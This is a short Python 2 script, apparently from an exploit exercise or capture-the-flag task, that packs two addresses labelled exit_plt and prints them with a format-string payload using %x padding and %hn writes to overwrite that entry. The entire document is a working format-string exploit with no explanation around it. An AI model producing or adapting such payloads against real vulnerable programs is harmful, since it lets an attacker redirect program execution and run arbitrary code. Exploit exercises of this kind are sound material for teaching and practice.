import struct

exit_plt  = struct.pack('I', 0x80497e0)
exit_plt += struct.pack('I', 0x80497e2)

print exit_plt + "%55294x%10$hn%10241x%11$hn"
